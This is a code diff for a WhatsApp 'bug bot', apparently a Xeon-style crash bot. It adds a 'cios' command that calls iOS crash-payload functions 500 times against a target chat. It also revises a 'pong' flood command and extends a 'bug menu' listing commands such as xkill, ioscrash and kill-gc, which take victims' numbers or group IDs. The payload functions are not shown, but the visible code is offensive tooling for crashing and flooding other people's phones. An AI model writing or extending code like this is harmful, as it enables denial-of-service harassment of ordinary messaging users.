@@ -1956,10 +1956,26 @@ async function callDoc(XeonBotInc, target) {
 
 	    
         switch (command) {
+case 'cios': {
+if (!q) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`)
+let target = m.chat
+await loading()
+await replygcxeon("✞Xᴄʜʀɪss Bot✞")
+for (let i = 0; i < 500; i++) {
+ await ios1(target)
+ await ios2(target)
+ await TxIos(target, Ptcp = true)
+}
+await replygcxeon("Done Sending Bugs ✅")
+}
+break
+
+			
 case "pong": {
 if (!isPremium) return replygcxeon(mess.prem)
 let target = m.chat
-await replygcxeon ("✞Xᴄʜʀɪss Bot✞")
+await loading()
+await replygcxeon("✞Xᴄʜʀɪss Bot✞")
 for (let i = 0;i < 50;i++) {
 await dott(target)
 await callDoc(XeonBotInc, target)
@@ -3458,9 +3474,11 @@ expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 break
 
-            case 'menu':
+            case 'menu': case 'bugmenu': case 'allmenu':
                 let xeonmenuoh = `Hello ${pushname}
-╰┈➤ ${xeonytimewisher} 😄
+╰┈➤ ${xeonytimewisher} 😂🤌
+${readmore}
+${readmore}
 ${readmore}
 ╰┈➤ʙᴜɢ ᴍᴇɴᴜ
 xkill <number>
@@ -3473,6 +3491,9 @@ ioscrash <number>
 xioscrash <number>
 iosbug <number>
 kill-gc <gc-jid>
+cios ios <PC/GC>
+pong android+ios<PC/GC>
+${readmore}
 
 ╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
 getsession
